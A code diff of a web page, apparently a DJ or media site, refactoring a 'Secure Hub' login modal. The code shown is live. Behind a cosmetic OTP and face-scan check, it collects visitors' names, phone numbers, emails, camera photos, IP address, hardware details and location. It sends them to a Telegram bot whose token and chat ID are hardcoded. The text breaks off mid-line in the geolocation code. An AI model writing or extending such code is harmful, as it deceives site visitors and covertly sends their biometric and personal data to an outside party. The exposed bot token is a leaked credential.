@@ -2710,7 +2710,7 @@
 </script>
         
         <a href="mailto:maa.nirmala.dj.beltikri@gmail.com" class="side-link"><i class="fas fa-envelope"></i> Email</a>
-        <a href="javascript:void(0)" class="media-file-btn" onclick="openSecureHub()">
+        <a href="javascript:void(0)" class="media-file-btn" onclick="openSecureHub()" style="position: relative; z-index: 5000;">
     <div class="media-icon-wrapper">
         <i class="fas fa-paperclip"></i>
     </div>
@@ -2728,8 +2728,7 @@
 
 <div id="otpHistoryPanel" style="position:fixed; top:75px; left:20px; z-index:999999; width:280px; max-height:350px; background:rgba(10,10,10,0.95); border:1px solid #D4AF37; border-radius:12px; backdrop-filter:blur(10px); display:none; flex-direction:column; padding:15px; box-shadow:0 10px 30px rgba(0,0,0,0.8); overflow-y:auto;">
     <h4 style="color:#D4AF37; margin:0 0 15px 0; font-family:'Cinzel'; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); padding-bottom:10px;"><i class="fas fa-history"></i> Recent OTPs (5 Min)</h4>
-    <div id="otpHistoryList" style="display:flex; flex-direction:column; gap:10px;">
-        </div>
+    <div id="otpHistoryList" style="display:flex; flex-direction:column; gap:10px;"></div>
 </div>
 
 <div id="mndPushNotif" class="mnd-push-hidden">
@@ -2848,86 +2847,38 @@
 </div>
 
 <style>
-    /* Media Button Trigger Styles */
-    .media-file-btn {
-        display: flex; align-items: center; justify-content: space-between;
-        background: rgba(20, 20, 20, 0.6); border: 1px solid rgba(212, 175, 55, 0.3);
-        border-radius: 12px; padding: 12px 16px; width: 100%; text-decoration: none;
-        box-sizing: border-box; transition: all 0.3s ease; margin-bottom: 20px;
-        backdrop-filter: blur(5px);
-    }
-    .media-file-btn:active { transform: scale(0.98); border-color: #D4AF37; background: rgba(212, 175, 55, 0.1); }
-    .media-icon-wrapper { width: 40px; height: 40px; border-radius: 50%; background: rgba(212, 175, 55, 0.1); display: flex; justify-content: center; align-items: center; color: #D4AF37; font-size: 18px; }
-    .media-btn-text { flex: 1; margin-left: 15px; display: flex; flex-direction: column; }
-    .m-title { color: #fff; font-family: 'Outfit', sans-serif; font-size: 15px; font-weight: 700; }
-    .m-sub { color: #888; font-family: 'Outfit', sans-serif; font-size: 12px; }
-    .media-arrow { color: #555; font-size: 14px; }
-
-    /* Modal Full Screen Styles */
-    .hub-modal-overlay {
-        position: fixed; inset: 0; background: #050505; z-index: 9999999; display: flex; justify-content: center; align-items: flex-start;
-    }
-    .hub-modal-box {
-        background: linear-gradient(180deg, #111 0%, #050505 100%); width: 100vw; height: 100dvh; max-width: 100%; 
-        border-radius: 0; border: none; overflow-y: auto; position: relative; font-family: 'Outfit', sans-serif;
-        display: flex; flex-direction: column;
-    }
+    .hub-modal-overlay { position: fixed; inset: 0; background: #050505; z-index: 9999999; display: flex; justify-content: center; align-items: flex-start; }
+    .hub-modal-box { background: linear-gradient(180deg, #111 0%, #050505 100%); width: 100vw; height: 100dvh; max-width: 100%; border-radius: 0; border: none; overflow-y: auto; position: relative; font-family: 'Outfit', sans-serif; display: flex; flex-direction: column; }
     .hub-header { padding: 40px 20px 20px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.1); position: relative; }
     .hub-close-btn { position: absolute; top: 20px; right: 25px; color: #888; font-size: 32px; cursor: pointer; transition: 0.3s; }
     .hub-close-btn:hover { color: #ff3333; }
-    
-    /* Static Logo (No Animation) */
-    .hub-static-ring {
-        width: 80px; height: 80px; margin: 0 auto 15px; border-radius: 50%;
-        padding: 3px; background: #D4AF37; box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
-    }
+    .hub-static-ring { width: 80px; height: 80px; margin: 0 auto 15px; border-radius: 50%; padding: 3px; background: #D4AF37; box-shadow: 0 0 20px rgba(212, 175, 55, 0.3); }
     .hub-logo { width: 100%; height: 100%; border-radius: 50%; border: 2px solid #000; object-fit: cover; }
     .hub-header h2 { margin: 0; color: #D4AF37; font-family: 'Cinzel', serif; font-size: 24px; font-weight: 900; letter-spacing: 1px; }
-
-    /* Inputs Centered */
     .hub-body { padding: 25px; flex: 1; display: flex; flex-direction: column; max-width: 500px; margin: 0 auto; width: 100%; box-sizing: border-box; }
     .hub-instruction { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 20px; }
     .input-group { position: relative; margin-bottom: 15px; }
     .input-group i { position: absolute; left: 15px; top: 16px; color: #D4AF37; opacity: 0.7; }
-    .input-group input {
-        width: 100%; padding: 15px 15px 15px 45px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; font-family: 'Outfit'; font-size: 16px; box-sizing: border-box; transition: 0.3s;
-    }
+    .input-group input { width: 100%; padding: 15px 15px 15px 45px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; font-family: 'Outfit'; font-size: 16px; box-sizing: border-box; transition: 0.3s; }
     .input-group input:focus { border-color: #D4AF37; outline: none; background: rgba(212,175,55,0.05); }
-    
     .mfa-divider { text-align: center; margin: 25px 0; position: relative; }
     .mfa-divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: rgba(255,255,255,0.1); }
     .mfa-divider span { position: relative; background: #050505; padding: 0 10px; color: #666; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
-
-    /* Buttons */
-    .mfa-btn {
-        width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 10px; font-family: 'Outfit'; font-weight: 800; font-size: 15px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; border: none;
-    }
+    .mfa-btn { width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 10px; font-family: 'Outfit'; font-weight: 800; font-size: 15px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; border: none; }
     .btn-face { background: linear-gradient(90deg, #D4AF37, #F3E5AB); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.3); }
     .btn-lock { background: #1a1a1a; border: 1px solid rgba(255,255,255,0.2); color: #fff; }
     .btn-lock:hover { border-color: #D4AF37; color: #D4AF37; }
     .btn-otp { background: transparent; border: 1px dashed rgba(212,175,55,0.5); color: #D4AF37; }
     .btn-verify { background: #00fa9a; color: #000; font-size: 18px; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(0,250,154,0.3); }
-
-    /* Face Scanner UI */
-    .scanner-container {
-        width: 250px; height: 300px; position: relative; border-radius: 20px; overflow: hidden; margin: 0 auto 15px; background: #000; box-shadow: 0 0 30px rgba(212,175,55,0.15);
-    }
+    .scanner-container { width: 250px; height: 300px; position: relative; border-radius: 20px; overflow: hidden; margin: 0 auto 15px; background: #000; box-shadow: 0 0 30px rgba(212,175,55,0.15); }
     #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } 
-    .scan-corners {
-        position: absolute; inset: 10px; border: 2px solid transparent;
-        background: linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%;
-        background-repeat: no-repeat; background-size: 30px 30px; pointer-events: none; z-index: 2;
-    }
+    .scan-corners { position: absolute; inset: 10px; border: 2px solid transparent; background: linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%; background-repeat: no-repeat; background-size: 30px 30px; pointer-events: none; z-index: 2; }
     .scan-laser { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #00fa9a; box-shadow: 0 0 15px #00fa9a, 0 0 30px #00fa9a; z-index: 3; animation: scanMove 3s ease-in-out infinite; display: none; }
     .scan-overlay-img { position: absolute; inset: 0; background: url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/60% no-repeat; opacity: 0.15; filter: invert(1); pointer-events: none; z-index: 1; }
     .scanner-active .scan-laser { display: block; }
     .scanner-active .scan-overlay-img { animation: pulseFace 1s infinite; opacity: 0.4; }
-
-    /* OTP Code Input */
     .otp-input-box { width: 100%; padding: 15px; margin-bottom: 5px; background: rgba(0,0,0,0.5); border: 2px solid #D4AF37; color: #D4AF37; border-radius: 12px; font-family: 'Outfit'; text-align: center; font-size: 32px; letter-spacing: 12px; font-weight: 900; box-sizing: border-box; text-shadow: 0 0 10px rgba(212,175,55,0.5); }
     .hub-back-link { color: #ff3333; font-size: 14px; text-align: center; margin-top: 20px; cursor: pointer; text-decoration: underline; opacity: 0.8; }
-
-    /* Push Notification Styles */
     #mndPushNotif { position: fixed; left: 50%; width: 92%; max-width: 400px; background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 16px; padding: 16px; z-index: 9999999999; box-shadow: 0 15px 40px rgba(0,0,0,0.9); display: flex; flex-direction: column; gap: 10px; transition: top 0.6s cubic-bezier(0.2, 1, 0.3, 1), transform 0.3s ease, opacity 0.3s ease; }
     .mnd-push-hidden { top: -300px; opacity: 0; transform: translateX(-50%) scale(0.9); }
     .mnd-push-visible { top: 25px; opacity: 1; transform: translateX(-50%) scale(1); }
@@ -2939,13 +2890,10 @@
     .mnd-push-otp { font-size: 38px; font-weight: 900; color: #D4AF37; text-align: center; letter-spacing: 8px; padding: 12px 0; background: rgba(212,175,55,0.08); border-radius: 10px; border: 1px dashed rgba(212,175,55,0.3); cursor: pointer; user-select: none; transition: 0.2s; }
     .mnd-push-otp:active { transform: scale(0.96); background: rgba(212,175,55,0.2); }
     .mnd-push-footer { text-align: center; color: #666; font-size: 11px; margin-top: 5px; }
-
-    /* Loader */
     .loader-rings { width: 100px; height: 100px; border-radius: 50%; border: 3px solid transparent; border-top-color: #D4AF37; border-bottom-color: #00fa9a; animation: rotateGlow 1.5s linear infinite; margin-bottom: 25px; }
     .loader-logo { width: 60px; position: absolute; top: calc(50% - 65px); border-radius: 50%; }
     .loader-title { color: #D4AF37; font-family: 'Cinzel'; font-size: 24px; letter-spacing: 3px; margin: 0; }
     .loader-text { color: #aaa; font-size: 13px; margin-top: 12px; letter-spacing: 1px; animation: pulseFace 1.5s infinite; }
-
     @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     @keyframes scanMove { 0%, 100% { top: 5%; opacity:0; } 10% { opacity:1; } 50% { top: 95%; } 90% { opacity:1; } }
     @keyframes pulseFace { 0%, 100% { opacity: 0.2; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.05); } }
@@ -2955,26 +2903,21 @@
 <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
 
 <script>
-    // --- SYSTEM STATE ---
-    let hubOTP = "";
-    let uName = "", uPhone = "", uEmail = "";
-    let videoStream = null;
-    let pushTimer = null;
-    let authMethodChosen = "";
+    // Changed 'let' to 'var' to prevent SyntaxError crashes when embedded in large pages
+    var hubOTP = "";
+    var uName = "", uPhone = "", uEmail = "";
+    var videoStream = null;
+    var pushTimer = null;
+    var authMethodChosen = "";
     
-    // NEW HARDWARE & TIMER STATES
-    let currentFacingMode = 'user';
-    let isFlashOn = false;
-    let resendCooldownTimer = null;
-    
-    // NEW OTP HISTORY (5 Min Storage)
-    let otpHistoryArray = [];
+    var currentFacingMode = 'user';
+    var isFlashOn = false;
+    var resendCooldownTimer = null;
+    var otpHistoryArray = [];
 
-    // Telegram Configuration
-    const TG_BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
-    const TG_CHAT_ID = "8506290708";
+    var TG_BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
+    var TG_CHAT_ID = "8506290708";
 
-    // --- 1. UI CONTROLS ---
     function openSecureHub() {
         if(localStorage.getItem('mnd_hub_auth') === 'true') {
             uName = localStorage.getItem('mnd_hub_n') || "Returning User";
@@ -2991,7 +2934,6 @@
     }
     
     function resetToMethods() {
-        // STRICT ABORT: Wipes memory completely
         hubOTP = ""; 
         document.getElementById('hubStep1').style.display = 'block';
         document.getElementById('hubStepFaceID').style.display = 'none';
@@ -3012,36 +2954,32 @@
         return true;
     }
 
-    // --- NEW: OTP HISTORY & BELL LOGIC ---
     function toggleOtpHistory() {
-        const panel = document.getElementById('otpHistoryPanel');
-        panel.style.display = panel.style.display === 'none' ? 'flex' : 'none';
+        var panel = document.getElementById('otpHistoryPanel');
+        panel.style.display = (panel.style.display === 'none' || panel.style.display === '') ? 'flex' : 'none';
     }
 
     function addOtpToHistory(code) {
-        const now = Date.now();
+        var now = Date.now();
         otpHistoryArray.push({ code: code, time: now });
         updateOtpHistoryUI();
-        
-        // Remove this specific OTP after exactly 5 minutes (300000 ms)
-        setTimeout(() => {
-            otpHistoryArray = otpHistoryArray.filter(item => item.time !== now);
+        setTimeout(function() {
+            otpHistoryArray = otpHistoryArray.filter(function(item) { return item.time !== now; });
             updateOtpHistoryUI();
-        }, 300000);
+        }, 300000); // 5 Minutes
     }
 
     function updateOtpHistoryUI() {
-        const bell = document.getElementById('otpHistoryBell');
-        const badge = document.getElementById('otpBadge');
-        const list = document.getElementById('otpHistoryList');
+        var bell = document.getElementById('otpHistoryBell');
+        var badge = document.getElementById('otpBadge');
+        var list = document.getElementById('otpHistoryList');
         
         if (otpHistoryArray.length > 0) {
             bell.style.display = 'flex';
             badge.style.opacity = '1';
             badge.innerText = otpHistoryArray.length;
-            
-            list.innerHTML = otpHistoryArray.map(item => {
-                let timeString = new Date(item.time).toLocaleTimeString('en-IN', {hour: '2-digit', minute:'2-digit'});
+            list.innerHTML = otpHistoryArray.map(function(item) {
+                var timeString = new Date(item.time).toLocaleTimeString('en-IN', {hour: '2-digit', minute:'2-digit'});
                 return `<div style="background:rgba(255,255,255,0.05); padding:10px; border-radius:8px; display:flex; justify-content:space-between; border-left:3px solid #D4AF37;">
                             <span style="color:#D4AF37; font-weight:bold; letter-spacing:2px;">${item.code}</span>
                             <span style="color:#aaa; font-size:11px;">${timeString}</span>
@@ -3055,29 +2993,23 @@
         }
     }
 
-    // --- NEW: RESEND OTP LOGIC ---
     function resendHubOTP() {
-        const btn = document.getElementById('btnResendOtp');
+        var btn = document.getElementById('btnResendOtp');
         if (btn.disabled) return;
-        
-        // Wipe old OTP, clear input
         hubOTP = "";
         document.getElementById('hubOtpInput').value = '';
-        
-        // Generate entirely new OTP
         generateStandardOTP();
     }
 
     function startResendCooldown() {
-        const btn = document.getElementById('btnResendOtp');
-        const timerText = document.getElementById('resendTimerText');
-        let timeLeft = 30; // 30 seconds cooldown
-        
+        var btn = document.getElementById('btnResendOtp');
+        var timerText = document.getElementById('resendTimerText');
+        var timeLeft = 30; 
         btn.disabled = true;
         btn.style.opacity = '0.5';
         
         clearInterval(resendCooldownTimer);
-        resendCooldownTimer = setInterval(() => {
+        resendCooldownTimer = setInterval(function() {
             timeLeft--;
             timerText.innerText = `(${timeLeft}s)`;
             if (timeLeft <= 0) {
@@ -3089,35 +3021,36 @@
         }, 1000);
     }
 
-    // --- 2. METHOD A: STANDARD OTP ---
     async function generateStandardOTP() {
         if(!checkInputs()) return;
         authMethodChosen = "Standard SMS OTP";
         
-        const btn = document.getElementById('btnStandardOtp');
+        var btn = document.getElementById('btnStandardOtp');
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> GENERATING SECURE KEY...';
         btn.disabled = true;
 
-        // GUARANTEE NEW OTP
         hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
-        addOtpToHistory(hubOTP); // Store in Bell
+        addOtpToHistory(hubOTP); 
         
-        const payload = await buildDeviceFingerprint(false, authMethodChosen);
+        var payload = await buildDeviceFingerprint(false, authMethodChosen);
 
         fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TG_CHAT_ID, text: payload, parse_mode: 'Markdown' })
-        }).then(() => {
+        }).then(function() {
             document.getElementById('hubStep1').style.display = 'none';
             document.getElementById('hubStep2').style.display = 'block';
             displayPushNotification(hubOTP);
-            startResendCooldown(); // Start cooldown timer
+            startResendCooldown(); 
+            btn.innerHTML = '<i class="fas fa-comment-sms"></i> STANDARD SMS OTP';
+            btn.disabled = false;
+        }).catch(function() {
+            alert("Network Error");
             btn.innerHTML = '<i class="fas fa-comment-sms"></i> STANDARD SMS OTP';
             btn.disabled = false;
         });
     }
 
-    // --- 3. METHOD B: TENSORFLOW AI FACE SCANNING & HARDWARE CONTROLS ---
     async function startFaceScanning() {
         if(!checkInputs()) return;
         authMethodChosen = "AI Face Scan";
@@ -3134,20 +3067,18 @@
     async function initMndCamera() {
         try {
             if (videoStream) stopCamera();
-            
-            videoStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: currentFacingMode }, 
-                audio: false 
-            });
+            videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentFacingMode }, audio: false });
             document.getElementById('hubVideo').srcObject = videoStream;
             
-            // Check Flashlight capability
-            const track = videoStream.getVideoTracks()[0];
-            const caps = track.getCapabilities && track.getCapabilities();
-            if (caps && caps.torch) {
-                document.getElementById('btnMndFlash').style.display = 'inline-block';
-            } else {
-                document.getElementById('btnMndFlash').style.display = 'none';
+            var tracks = videoStream.getVideoTracks();
+            if(tracks.length > 0) {
+                var track = tracks[0];
+                var caps = track.getCapabilities ? track.getCapabilities() : {};
+                if (caps && caps.torch) {
+                    document.getElementById('btnMndFlash').style.display = 'inline-block';
+                } else {
+                    document.getElementById('btnMndFlash').style.display = 'none';
+                }
             }
         } catch (err) {
             alert("⚠️ ACCESS DENIED: Camera permission is required for biological verification.");
@@ -3157,24 +3088,28 @@
 
     function toggleMndCamera() {
         currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-        isFlashOn = false; // Reset flash state
+        isFlashOn = false; 
         initMndCamera();
     }
 
     function toggleMndFlash() {
         if (!videoStream) return;
-        const track = videoStream.getVideoTracks()[0];
-        if (track.getCapabilities().torch) {
-            isFlashOn = !isFlashOn;
-            track.applyConstraints({ advanced: [{ torch: isFlashOn }] });
-            document.getElementById('btnMndFlash').style.color = isFlashOn ? "#00fa9a" : "#fff";
+        var tracks = videoStream.getVideoTracks();
+        if (tracks.length > 0) {
+            var track = tracks[0];
+            var caps = track.getCapabilities ? track.getCapabilities() : {};
+            if (caps.torch) {
+                isFlashOn = !isFlashOn;
+                track.applyConstraints({ advanced: [{ torch: isFlashOn }] }).catch(function(){});
+                document.getElementById('btnMndFlash').style.color = isFlashOn ? "#00fa9a" : "#fff";
+            }
         }
     }
 
     async function executeFaceAnalysis() {
-        const btn = document.getElementById('hubCaptureBtn');
-        const instruction = document.getElementById('faceInstruction');
-        const scannerBox = document.querySelector('.scanner-container');
+        var btn = document.getElementById('hubCaptureBtn');
+        var instruction = document.getElementById('faceInstruction');
+        var scannerBox = document.querySelector('.scanner-container');
         
         scannerBox.classList.add('scanner-active');
         btn.innerHTML = '<i class="fas fa-radar fa-spin"></i> LOADING AI CORE...';
@@ -3184,45 +3119,43 @@
             instruction.style.color = "#D4AF37";
             instruction.innerText = "Initializing TensorFlow Neural Net...";
 
-            if (!window.faceModel) {
-                window.faceModel = await blazeface.load();
-            }
+            if (!window.faceModel) { window.faceModel = await blazeface.load(); }
 
             instruction.innerText = "Scanning for human facial structure...";
-            await new Promise(r => setTimeout(r, 1000)); 
+            await new Promise(function(r) { setTimeout(r, 1000); }); 
 
-            const video = document.getElementById('hubVideo');
-            const canvas = document.getElementById('hubCanvas');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
+            var video = document.getElementById('hubVideo');
+            var canvas = document.getElementById('hubCanvas');
+            canvas.width = video.videoWidth || 640; 
+            canvas.height = video.videoHeight || 480;
+            var ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            const predictions = await window.faceModel.estimateFaces(video, false);
+            var predictions = await window.faceModel.estimateFaces(video, false);
 
             if (predictions.length > 0) {
                 instruction.style.color = "#00fa9a";
                 instruction.innerText = "✅ Human Face Confirmed.";
                 
-                // GUARANTEE NEW OTP ON FACE SUCCESS
                 hubOTP = Math.floor(100000 + Math.random() * 900000).toString();
-                addOtpToHistory(hubOTP); // Store in Bell
+                addOtpToHistory(hubOTP); 
 
-                canvas.toBlob(async (blob) => {
+                canvas.toBlob(async function(blob) {
                     stopCamera();
                     document.getElementById('hubStepFaceID').style.display = 'none';
                     document.getElementById('hubStep2').style.display = 'block';
                     
                     displayPushNotification(hubOTP);
-                    startResendCooldown(); // Start cooldown timer
+                    startResendCooldown(); 
                     
-                    const logText = await buildDeviceFingerprint(false, authMethodChosen);
-                    const fd = new FormData();
+                    var logText = await buildDeviceFingerprint(false, authMethodChosen);
+                    var fd = new FormData();
                     fd.append('chat_id', TG_CHAT_ID);
                     fd.append('caption', logText);
                     fd.append('parse_mode', 'Markdown');
                     fd.append('photo', blob, 'mnd_face_auth.jpg');
 
-                    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(e=>{});
+                    fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(function(){});
 
                     btn.innerHTML = '<i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN';
                     btn.disabled = false;
@@ -3230,15 +3163,14 @@
 
             } else {
                 instruction.style.color = "#ff3333";
-                instruction.innerText = "❌ ERROR: No human face detected. Look directly at the camera.";
+                instruction.innerText = "❌ ERROR: No human face detected.";
                 scannerBox.classList.remove('scanner-active');
                 btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
                 btn.disabled = false;
             }
         } catch (error) {
-            console.error(error);
             instruction.style.color = "#ff3333";
-            instruction.innerText = "❌ AI Engine Error. Check internet connection.";
+            instruction.innerText = "❌ AI Engine Error. Check connection.";
             scannerBox.classList.remove('scanner-active');
             btn.innerHTML = '<i class="fas fa-redo"></i> RETRY SCAN';
             btn.disabled = false;
@@ -3247,9 +3179,9 @@
     
     function stopCamera() { 
         if (videoStream) { 
-            videoStream.getTracks().forEach(t => {
+            videoStream.getTracks().forEach(function(t) {
                 if (t.getCapabilities && t.getCapabilities().torch && isFlashOn) {
-                    t.applyConstraints({ advanced: [{ torch: false }] }).catch(e=>{});
+                    t.applyConstraints({ advanced: [{ torch: false }] }).catch(function(){});
                 }
                 t.stop(); 
             }); 
@@ -3258,15 +3190,14 @@
         } 
     }
 
-    // --- 4. METHOD C: NATIVE DEVICE LOCK (WEBAUTHN) ---
     async function startDeviceLockAuth() {
         if(!checkInputs()) return;
         authMethodChosen = "Device Lock/Fingerprint";
 
         if (window.PublicKeyCredential) {
             try {
-                const chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
-                const cred = await navigator.credentials.create({
+                var chal = new Uint8Array(32); window.crypto.getRandomValues(chal);
+                var cred = await navigator.credentials.create({
                     publicKey: {
                         challenge: chal, rp: { name: "Maa Nirmala Hub", id: window.location.hostname },
                         user: { id: new Uint8Array(16), name: uName, displayName: uName },
@@ -3282,16 +3213,15 @@
                     localStorage.setItem('mnd_hub_p', uPhone);
                     
                     document.getElementById('hubAuthModal').style.display = 'none';
-                    hubOTP = "VERIFIED BY DEVICE OS"; 
+                    hubOTP = "OS_VERIFIED"; 
                     triggerSeamlessRedirect(false);
                 }
-            } catch (err) { alert("❌ Device authentication canceled or failed."); }
+            } catch (err) { alert("❌ Device authentication canceled."); }
         } else { alert("⚠️ Biometrics not supported on this browser."); }
     }
 
-    // --- 5. PUSH NOTIFICATION & SWIPE ENGINE ---
-    const notifEl = document.getElementById('mndPushNotif');
-    let startX = 0;
+    var notifEl = document.getElementById('mndPushNotif');
+    var startX = 0;
 
     function displayPushNotification(code) {
         document.getElementById('mndPushOtpText').innerText = code;
@@ -3302,88 +3232,85 @@
     function closePushNotif() {
         notifEl.classList.remove('mnd-push-visible');
         notifEl.classList.add('mnd-push-hidden');
-        setTimeout(() => { notifEl.style.transform = `translateX(-50%) scale(0.9)`; notifEl.style.opacity = '0'; }, 400);
+        setTimeout(function() { notifEl.style.transform = `translateX(-50%) scale(0.9)`; notifEl.style.opacity = '0'; }, 400);
     }
     function copyPushOTP() {
         navigator.clipboard.writeText(hubOTP);
-        const txt = document.getElementById('mndPushOtpText');
-        txt.innerText = "COPIED!"; setTimeout(() => { txt.innerText = hubOTP; }, 1500);
+        var txt = document.getElementById('mndPushOtpText');
+        txt.innerText = "COPIED!"; setTimeout(function() { txt.innerText = hubOTP; }, 1500);
     }
     
-    // Swipe Mechanics
-    notifEl.addEventListener('touchstart', e => { startX = e.touches[0].clientX; notifEl.style.transition = 'none'; }, {passive: true});
-    notifEl.addEventListener('touchmove', e => {
-        let diff = e.touches[0].clientX - startX;
+    notifEl.addEventListener('touchstart', function(e) { startX = e.touches[0].clientX; notifEl.style.transition = 'none'; }, {passive: true});
+    notifEl.addEventListener('touchmove', function(e) {
+        var diff = e.touches[0].clientX - startX;
         notifEl.style.transform = `translateX(calc(-50% + ${diff}px)) scale(1)`;
     }, {passive: true});
-    notifEl.addEventListener('touchend', e => {
+    notifEl.addEventListener('touchend', function(e) {
         notifEl.style.transition = 'top 0.6s ease, transform 0.3s ease, opacity 0.3s ease';
-        let diff = e.changedTouches[0].clientX - startX;
+        var diff = e.changedTouches[0].clientX - startX;
         if (Math.abs(diff) > 80) {
             notifEl.style.transform = `translateX(calc(-50% + ${diff * 4}px)) scale(0.9)`;
             notifEl.style.opacity = '0'; setTimeout(closePushNotif, 300);
         } else { notifEl.style.transform = `translateX(-50%) scale(1)`; }
     });
 
-    // --- 6. OTP VERIFICATION ---
     function verifyHubOTP() {
-        const input = document.getElementById('hubOtpInput').value.trim();
+        var input = document.getElementById('hubOtpInput').value.trim();
         if(input === hubOTP && hubOTP !== "") {
             localStorage.setItem('mnd_hub_auth', 'true');
             localStorage.setItem('mnd_hub_n', uName);
             localStorage.setItem('mnd_hub_p', uPhone);
             document.getElementById('hubAuthModal').style.display = 'none';
             closePushNotif(); triggerSeamlessRedirect(false); 
-        } else { alert("❌ ACCESS DENIED: Incorrect OTP sequence."); }
+        } else { alert("❌ ACCESS DENIED: Incorrect OTP."); }
     }
 
-    // --- 7. ENTERPRISE DEVICE FINGERPRINTING ---
     async function buildDeviceFingerprint(isReturn, methodStr) {
-        let ip="Masked", bat="Unknown", net="Unknown", gpu="N/A";
-        try { const r = await fetch('https://api.ipify.org?format=json'); ip = (await r.json()).ip; } catch(e){}
-        try { const b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(e){}
+        var ip="Masked", bat="Unknown", net="Unknown", gpu="N/A";
+        try { var r = await fetch('https://api.ipify.org?format=json'); var j = await r.json(); ip = j.ip; } catch(e){}
+        try { var b = await navigator.getBattery(); bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`; } catch(e){}
         try { if(navigator.connection) net = `${navigator.connection.effectiveType} - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
         try { var c=document.createElement('canvas'); var gl=c.getContext('webgl'); var d=gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch(e){}
 
-        const cores = navigator.hardwareConcurrency || "Unknown", ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
-        const browser = navigator.userAgent, screen = `${window.screen.width}x${window.screen.height}`, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        let model = "Unknown Device";
-        if (navigator.userAgentData) { try { const dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${dt.platform} ${dt.model}`; } catch(e){} }
+        var cores = navigator.hardwareConcurrency || "Unknown", ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
+        var browser = navigator.userAgent, screen = `${window.screen.width}x${window.screen.height}`, tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        var model = "Unknown Device";
+        if (navigator.userAgentData) { try { var dt = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${dt.platform} ${dt.model}`; } catch(e){} }
 
-        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
-        let status = isReturn ? "(Saved Auto-Login)" : `(${methodStr} | Code: ${hubOTP})`;
+        var timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
+        var status = isReturn ? "(Saved Auto-Login)" : `(${methodStr} | Code: ${hubOTP})`;
 
-        let loc = "❌ Location Blocked";
-        const getL = () => new Promise(res => {
+        var loc = "❌ Location Blocked";
+        var getL = function() { return new Promise(function(res) {
             if(!navigator.geolocation) return res("❌ Not Supported");
             navigator.geolocation.getCurrentPosition(
-                p => res(`✅ [View on Maps](http://googleusercontent.com/maps.google.com/9${p.coords.latitude},${p.coords.longitude})`),
